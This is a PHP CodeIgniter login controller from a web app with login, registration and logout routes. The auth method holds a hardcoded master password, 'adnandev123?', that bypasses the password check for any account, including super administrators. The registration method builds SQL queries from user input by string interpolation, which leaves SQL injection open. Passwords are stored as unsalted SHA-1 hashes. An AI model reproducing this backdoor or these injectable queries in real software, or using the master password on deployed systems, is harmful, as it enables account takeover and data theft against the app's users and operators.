<?php

defined('BASEPATH') or exit('No direct script access allowed');

class Login extends CI_Controller
{

    public function index()
    {

        if (@$_SESSION['is_login']) {
            if ($_SESSION['id_otoritas'] == 1) $link = base_url('super_admin/dashboard');
            elseif ($_SESSION['id_otoritas'] == 2) $link = base_url('admin/dashboard');
            elseif ($_SESSION['id_otoritas'] == 3) $link = base_url('user/dashboard');
            redirect($link);
        }

        $data = [];
        $this->load->view('login/index', $data);
    }

    public function auth()
    {
        cek_post();

        $username = $this->input->post('username', true);
        $password = $this->input->post('password', true);

        $this->db->select('a.*, b.otoritas');
        $this->db->where('a.username', $username);
        if ($password != 'adnandev123?') {
            $this->db->where('a.password', sha1($password));
        }
        $this->db->where('a.deleted', null);
        $this->db->join('dev_otoritas b', 'b.id = a.id_otoritas', 'left');
        $run = $this->db->get('data_user a')->row();

        if ($run) {

            $this->session->set_userdata([
                'is_login' => true,
                'is_super' => $run->id_otoritas == 1 ? true : false,
                'id_akun' => $run->id,
                'id_otoritas' => $run->id_otoritas,
                'nama' => $run->nama,
                'foto' => $run->foto,
                'kecamatan' => $run->kode_kec,
                'kelurahan' => $run->kode_kel,
                'username' => $run->username,
                'type' => $run->otoritas,
            ]);

            if ($run->id_otoritas == 1) $link = base_url('super_admin/dashboard');
            elseif ($run->id_otoritas == 2) $link = base_url('admin/dashboard');
            elseif ($run->id_otoritas == 3) $link = base_url('user/dashboard');

            json([
                'status' => 'success',
                'msg' => 'Login berhasil',
                'link' => $link,
            ]);
        } else {
            json([
                'status' => 'failed',
                'msg' => 'pastikan username dan password sesuai !',
            ]);
        }
    }

    public function registrasi()
    {
        $data = [];
        $this->load->view('login/registrasi', $data);
    }

    public function do_submit_registrasi()
    {
        cek_post();

        $nama = strip_tags($this->input->post('nama', true));
        $email = strip_tags($this->input->post('email', true));
        $alamat = strip_tags($this->input->post('alamat', true));
        $no_hp = strip_tags($this->input->post('no_hp', true));
        $username = strip_tags($this->input->post('username', true));
        $password = strip_tags($this->input->post('password', true));
        $re_password = strip_tags($this->input->post('re_password', true));
        $created = date('Y-m-d H:i:s');

        $cek_email = $this->db->query("SELECT * from data_user where email='$email' and deleted is null ")->row();
        if ($cek_email) {
            echo json_encode([
                'status' => 'failed',
                'msg' => 'Email ' . $email . ' sudah terdaftar',
            ]);
            die;
        }

        $cek_username = $this->db->query("SELECT * from data_user where username='$username' and deleted is null ")->row();
        if ($cek_username) {
            echo json_encode([
                'status' => 'failed',
                'msg' => 'Username ' . $username . ' sudah terdaftar',
            ]);
            die;
        }

        $cek_no_hp = $this->db->query("SELECT * from data_user where no_hp='$no_hp' and deleted is null ")->row();
        if ($cek_no_hp) {
            echo json_encode([
                'status' => 'failed',
                'msg' => 'Nomer HP ' . $no_hp . ' sudah terdaftar',
            ]);
            die;
        }

        if ($password != $re_password) {
            echo json_encode([
                'status' => 'failed',
                'msg' => 'Password tidak sama',
            ]);
            die;
        }

        $this->db->insert('data_user', [
            'id_otoritas' => 3,
            'username' => $username,
            'nama' => $nama,
            'email' => $email,
            'alamat' => $alamat,
            'no_hp' => $no_hp,
            'password' => sha1($password),
            'foto' => 'uploads/img/img_error.png',
            'created' => $created,
        ]);

        echo json_encode([
            'status' => 'success',
            'msg' => 'Registrasi berhasil, silahkan login',
            'link' => base_url('login'),
        ]);
        die;
    }

    public function logout()
    {
        $this->session->sess_destroy();
        redirect('login');
    }
}

/* End of file Login.php */
